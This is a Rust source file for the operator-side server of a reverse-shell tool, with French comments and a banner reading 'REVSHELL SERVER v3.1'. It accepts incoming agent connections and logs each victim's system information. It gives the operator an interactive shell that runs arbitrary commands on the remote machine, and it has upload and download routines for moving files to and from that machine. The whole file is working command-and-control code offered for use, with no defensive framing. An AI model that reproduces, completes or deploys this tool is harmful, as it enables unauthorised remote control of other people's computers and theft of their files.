use revshell_rs::*;
use std::fs::{File, OpenOptions};
use std::io::{self, Read, Write};
use std::net::{TcpListener, TcpStream};

fn timestamp() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
}

fn log_msg(logfile: &str, msg: &str) {
    let line = format!("[{}] {}", timestamp(), msg);
    println!("{}", line);
    if let Ok(mut f) = OpenOptions::new().create(true).append(true).open(logfile) {
        let _ = writeln!(f, "{}", line);
    }
}

fn read_until_end(stream: &mut TcpStream) -> Result<String, String> {
    let mut full = Vec::new();
    let mut tmp = [0u8; BUF_SIZE];
    loop {
        let n = stream.read(&mut tmp).map_err(|e| e.to_string())?;
        if n == 0 {
            return Err("closed".into());
        }
        full.extend_from_slice(&tmp[..n]);
        if contains_end_marker(&full) {
            break;
        }
    }
    Ok(String::from_utf8_lossy(&strip_end_marker(&full)).to_string())
}

/// Upload : server envoie fichier → agent
fn do_upload(stream: &mut TcpStream, local_path: &str, remote_path: &str, logfile: &str) -> bool {
    // Lire le fichier local
    let data = match std::fs::read(local_path) {
        Ok(d) => d,
        Err(e) => {
            log_msg(logfile, &format!("upload: can't read {}: {}", local_path, e));
            return false;
        }
    };

    // Envoyer la commande spéciale
    let cmd = format!("__upload {}\n", remote_path);
    if stream.write_all(cmd.as_bytes()).is_err() {
        return false;
    }

    // Attendre FILE_OK de l'agent (il est prêt)
    let mut ack = [0u8; 64];
    let n = match stream.read(&mut ack) {
        Ok(n) if n > 0 => n,
        _ => return false,
    };
    if !contains_marker(&ack[..n], FILE_OK) {
        log_msg(logfile, "upload: agent not ready");
        return false;
    }

    // Envoyer taille + données
    if send_size(stream, data.len() as u64).is_err() {
        return false;
    }
    if stream.write_all(&data).is_err() {
        return false;
    }

    // Attendre confirmation
    match read_until_end(stream) {
        Ok(resp) => {
            log_msg(logfile, &format!("upload: {}", resp.trim()));
            true
        }
        Err(e) => {
            log_msg(logfile, &format!("upload err: {}", e));
            false
        }
    }
}

/// Download : agent envoie fichier → server
fn do_download(
    stream: &mut TcpStream,
    remote_path: &str,
    local_path: &str,
    logfile: &str,
) -> bool {
    // Envoyer commande
    let cmd = format!("__download {}\n", remote_path);
    if stream.write_all(cmd.as_bytes()).is_err() {
        return false;
    }

    // Lire premier paquet (FILE_BEGIN ou FILE_ERR + END_MARKER)
    let mut header = [0u8; 128];
    let n = match stream.read(&mut header) {
        Ok(n) if n > 0 => n,
        _ => return false,
    };

    if contains_marker(&header[..n], FILE_ERR) {
        // Lire le message d'erreur complet
        match read_until_end(stream) {
            Ok(msg) => log_msg(logfile, &format!("download: {}", msg.trim())),
            Err(_) => log_msg(logfile, "download: remote error"),
        }
        return false;
    }

    if !contains_marker(&header[..n], FILE_BEGIN) {
        log_msg(logfile, "download: unexpected response");
        return false;
    }

    // Envoyer ACK
    if stream.write_all(FILE_OK).is_err() {
        return false;
    }

    // Recevoir taille
    let size = match recv_size(stream) {
        Ok(s) => s,
        Err(e) => {
            log_msg(logfile, &format!("download: {}", e));
            return false;
        }
    };

    // Recevoir données
    let data = match read_exact_bytes(stream, size as usize) {
        Ok(d) => d,
        Err(e) => {
            log_msg(logfile, &format!("download: {}", e));
            return false;
        }
    };

    // Écrire fichier local
    match File::create(local_path) {
        Ok(mut f) => {
            if f.write_all(&data).is_ok() {
                log_msg(
                    logfile,
                    &format!("download: {} → {} ({} bytes)", remote_path, local_path, size),
                );
                // Consommer le END_MARKER qui suit
                let _ = read_until_end(stream);
                true
            } else {
                log_msg(logfile, &format!("download: write error {}", local_path));
                false
            }
        }
        Err(e) => {
            log_msg(logfile, &format!("download: {}", e));
            false
        }
    }
}

fn handle_session(mut stream: TcpStream, peer: &str, logfile: &str) {
    // Handshake
    let mut hs = [0u8; 5];
    if stream.read_exact(&mut hs).is_err() || hs != HANDSHAKE_REQ {
        log_msg(logfile, &format!("{}: bad handshake", peer));
        return;
    }
    if stream.write_all(HANDSHAKE_ACK).is_err() {
        return;
    }
    log_msg(logfile, &format!("{}: connected", peer));

    // Sysinfo
    match read_until_end(&mut stream) {
        Ok(info) => log_msg(logfile, &format!("{} info:\n{}", peer, info.trim())),
        Err(e) => {
            log_msg(logfile, &format!("{}: {}", peer, e));
            return;
        }
    }

    let stdin = io::stdin();
    let mut input = String::new();

    loop {
        print!("\n\x1b[1;32mshell@{}\x1b[0m > ", peer);
        let _ = io::stdout().flush();
        input.clear();
        if stdin.read_line(&mut input).is_err() {
            break;
        }
        let cmd = input.trim();
        if cmd.is_empty() {
            continue;
        }

        match cmd {
            "exit" | "quit" => {
                let _ = stream.write_all(b"exit\n");
                log_msg(logfile, "session closed by operator");
                break;
            }
            "help" => {
                println!("  \x1b[1;36mCommandes internes :\x1b[0m");
                println!("    exit / quit            — fermer la session");
                println!("    upload <local> <remote> — envoyer fichier → agent");
                println!("    download <remote> <local> — récupérer fichier ← agent");
                println!("    powershell             — upgrade shell en PowerShell (Windows)");
                println!("    cmd                    — revenir en CMD (Windows)");
                println!("    help                   — cette aide");
                println!("  \x1b[1;36mTout autre input\x1b[0m → exécuté sur l'agent");
                continue;
            }
            _ => {}
        }

        // Commandes upload/download traitées côté server
        if cmd.starts_with("upload ") {
            let parts: Vec<&str> = cmd.splitn(3, ' ').collect();
            if parts.len() < 3 {
                println!("  usage: upload <local_path> <remote_path>");
                continue;
            }
            do_upload(&mut stream, parts[1], parts[2], logfile);
            continue;
        }

        if cmd.starts_with("download ") {
            let parts: Vec<&str> = cmd.splitn(3, ' ').collect();
            if parts.len() < 3 {
                println!("  usage: download <remote_path> <local_path>");
                continue;
            }
            do_download(&mut stream, parts[1], parts[2], logfile);
            continue;
        }

        // Commande standard → envoyer à l'agent
        if stream
            .write_all(format!("{}\n", cmd).as_bytes())
            .is_err()
        {
            log_msg(logfile, "send error");
            break;
        }
        log_msg(logfile, &format!("CMD > {}", cmd));

        match read_until_end(&mut stream) {
            Ok(out) => {
                let trimmed = out.trim();
                if !trimmed.is_empty() {
                    println!("{}", trimmed);
                }
                // Log séparé — pas de double print
                if let Ok(mut f) =
                    OpenOptions::new().create(true).append(true).open(logfile)
                {
                    let _ = writeln!(f, "[{}] OUT >\n{}", timestamp(), trimmed);
                }
            }
            Err(e) => {
                log_msg(logfile, &format!("recv err: {}", e));
                break;
            }
        }
    }
}

fn main() {
    let (host, port, logfile_opt) = parse_args();
    let logfile = logfile_opt.unwrap_or_else(|| "session.log".into());
    let addr = format!("{}:{}", host, port);

    println!("\x1b[1;35m╔═══════════════════════════════════════╗\x1b[0m");
    println!("\x1b[1;35m║    REVSHELL SERVER v3.1               ║\x1b[0m");
    println!("\x1b[1;35m║    Listening: {:<24}║\x1b[0m", addr);
    println!("\x1b[1;35m╚═══════════════════════════════════════╝\x1b[0m");

    let listener = match TcpListener::bind(&addr) {
        Ok(l) => l,
        Err(e) => {
            eprintln!("bind failed: {}", e);
            return;
        }
    };

    log_msg(&logfile, &format!("listening {}", addr));

    for incoming in listener.incoming() {
        match incoming {
            Ok(stream) => {
                let peer = stream
                    .peer_addr()
                    .map(|a| a.to_string())
                    .unwrap_or_else(|_| "?".into());
                log_msg(&logfile, &format!("new connection: {}", peer));
                handle_session(stream, &peer, &logfile);
            }
            Err(e) => log_msg(&logfile, &format!("accept err: {}", e)),
        }
    }
}
